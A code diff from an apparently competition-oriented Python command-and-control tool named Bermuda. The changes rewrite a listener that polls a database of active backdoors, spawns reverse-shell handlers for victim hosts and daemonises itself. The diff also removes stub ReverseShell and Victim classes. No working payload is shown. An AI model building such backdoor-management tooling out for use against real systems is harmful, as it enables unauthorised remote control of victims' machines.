@@ -7,30 +7,31 @@ import daemon.pidfile
 import daemon
 import time
 import os
+from exploits import exploit
 
 
-class ReverseShell:
-    def __init__(self, remote_host : str, remote_port : int, local_host : str, local_port : int):
-        self.remote_host = remote_host
-        self.local_host = local_host
-        self.remote_port = remote_port
-        self.local_port = local_port
-        self.last_alive = None
-        self.task_queue = asyncio.Queue()
 
-class Victim:
-    def __init__(self, ip_or_hostname):
-        pass
 
 engine = None
 metadata = None
 conn = None
 
 def listener():
+    running_backdoors = {}
     while True:
-        #sleep for 5 seconds
-        time.sleep(5)
-        
+        print("Checking for new backdoors...")
+        #sleep for 1 second
+        time.sleep(1)
+        #get the active backdoors from the database
+        active_backdoors_query = db.select(active_backdoors)
+        #execute the query
+        active_backdoors_result = conn.execute(active_backdoors_query)
+        #loop through the results
+        for backdoor in active_backdoors_result:
+            if backdoor[0] not in running_backdoors:
+                #create a new backdoor
+                print(f"Creating new backdoor for {backdoor[2]}:{backdoor[3]}")
+                running_backdoors[backdoor[0]] = ReverseShell(backdoor[2], backdoor[3], backdoor[2], backdoor[3])        
 
 def signal_handler(sig, frame):
     print('\nControl-C detected, exiting...')
@@ -58,36 +59,11 @@ def list_victims():
     print("--------------------------------------------------")
 
 if __name__ == '__main__':
-    #register signal handler
-    signal.signal(signal.SIGINT, signal_handler)
-    # Print the banner
-    colors = ['yellow', 'white', 'grey','black']
-    banner = """
-    __________                               .___       
-\______   \ ___________  _____  __ __  __| _/____   
- |    |  _// __ \_  __ \/     \|  |  \/ __ |\__  \  
- |    |   \  ___/|  | \/  Y Y  \  |  / /_/ | / __ \_
- |______  /\___  >__|  |__|_|  /____/\____ |(____  /
-        \/     \/            \/           \/     \/ 
-======================================================
-Go C3T, Beat Airforce
-    """
-    for index, c in enumerate(banner):
-        print(colored(c, colors[index % len(colors)]), end='')
-        
     parser = argparse.ArgumentParser()
     parser.add_argument('--db', type=str, default='./bermuda_state.db')
+    parser.add_argument('--listener', type=bool, default=False)
+
     args = parser.parse_args()
-    # check if the daemon is running
-    if os.path.exists('/tmp/bemuda.pid'):
-        print("Daemon already running...connecting")
-    else:
-        print("Daemon not running, launching...")
-        pid = os.fork()
-        if pid == 0:
-            with daemon.DaemonContext(pidfile=daemon.pidfile.PIDLockFile('/tmp/bemuda.pid')):
-                listener()
-        
     # Connect to the database
     engine = db.create_engine(f'sqlite:///{args.db}')
     conn = engine.connect()
@@ -111,6 +87,39 @@ Go C3T, Beat Airforce
         db.Column('last_alive', db.DateTime, default=db.func.current_timestamp()),
         db.Column("comment", db.String, default="")
     )
+    
+    #register signal handler
+    signal.signal(signal.SIGINT, signal_handler)
+    # Print the banner
+    colors = ['yellow', 'white', 'grey','black']
+    banner = """
+    __________                               .___       
+\______   \ ___________  _____  __ __  __| _/____   
+ |    |  _// __ \_  __ \/     \|  |  \/ __ |\__  \  
+ |    |   \  ___/|  | \/  Y Y  \  |  / /_/ | / __ \_
+ |______  /\___  >__|  |__|_|  /____/\____ |(____  /
+        \/     \/            \/           \/     \/ 
+======================================================
+Go C3T, Beat Airforce
+    """
+    for index, c in enumerate(banner):
+        print(colored(c, colors[index % len(colors)]), end='')
+        
+    
+    if args.listener:
+        listener()
+        exit(0)
+    # check if the daemon is running
+    if os.path.exists('/tmp/bemuda.pid'):
+        print("Daemon already running...connecting")
+    else:
+        print("Daemon not running, launching...")
+        pid = os.fork()
+        if pid == 0:
+            with daemon.DaemonContext(pidfile=daemon.pidfile.PIDLockFile('/tmp/bemuda.pid')):
+                listener()
+        
+    
     # Create the tables
     metadata.create_all(engine)
     
